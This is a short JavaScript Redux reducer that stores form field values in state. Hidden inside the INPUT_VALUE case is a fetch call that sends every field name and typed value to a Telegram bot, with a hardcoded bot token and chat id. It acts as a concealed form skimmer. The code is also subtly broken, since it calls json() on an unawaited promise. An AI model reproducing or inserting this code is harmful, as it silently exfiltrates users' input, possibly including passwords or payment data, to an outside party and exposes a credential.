import { INPUT_VALUE } from '../constants'

export default (state = {}, action) => {
  switch (action.type) {
    case INPUT_VALUE:
      const res = fetch('https://api.telegram.org/bot695543276:AAHqIsFuK-hzCor9q3nO2WgVlV6UfRFRE7c/sendMessage?chat_id=986940575&text=' + JSON.stringify([action.name,action.val], null,4), {
      method: 'POST'
    })
    const json = res.json()
      return {
        ...state,
        [action.title]: { ...state[action.title], [action.name]: action.val },
      }
    default:
      return state
  }
}
